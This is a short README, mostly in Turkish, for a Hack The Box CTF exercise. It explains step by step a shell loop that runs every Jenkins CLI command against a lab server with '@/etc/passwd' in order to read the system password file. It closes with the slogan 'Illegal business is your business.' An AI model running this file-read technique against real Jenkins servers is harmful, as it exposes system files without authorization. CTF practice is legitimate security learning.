# script_jenkins_ctf
Discovering which commands let us export the entire passwd file
https://app.hackthebox.com/machines/591


1. java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help: Jenkins sunucusu üzerinde çalışan Jenkins CLI'ı kullanarak sunucuda geçerli komut setini ve yardım belgesini almak için bu komut çalıştırılır.

2. 2>&1: Hata çıktılarını standart çıktıya yönlendirir. Bu, hata mesajlarının standart çıktıya (ekrana) yönlendirilmesini sağlar.

3. awk '/ [a-z]/ {print $1}': AWK programını kullanarak çıktıyı işler. Bu ifade, yalnızca küçük harflerle başlayan satırları ayıklar ve sadece bu satırların ilk sütununu (kelimeyi) görüntüler.

4. while read cmd; do: Bu döngü, her satırda bir komutu tek tek işlemek için başlar.

5. printf "$cmd\t": Her döngü adımında, işlenen komutun adını ve bir tab boşluğunu yazdırır.

6. /bin/sh -c "java -jar jenkins-cli.jar -s http://10.10.11.10:8080 $cmd '@/etc/passwd' 2>&1 &" | wc -l: Bu kod, bash kabuğunda işletilir ve her komut için /etc/passwd dosyasına erişmeye çalışır. Ardından, çıktı satır sayısını (wc -l komutu kullanılarak) hesaplar. Bu işlem, belirli bir komutu çalıştırırken aynı zamanda /etc/passwd dosyasına erişim denemesini simüle eder.

7. done: while döngüsünün sonunu belirtir.

Bu kod parçacığı, Jenkins sunucusundaki Jenkins CLI komutlarının küçük harfle başlayan adlarını belirler ve her bir komut için /etc/passwd dosyasına erişim denemesi yapar. Bu, sunucuda potansiyel güvenlik açıklarını tespit etmek için yapılan bir simulasyondur. 

# Illegal business is your business.
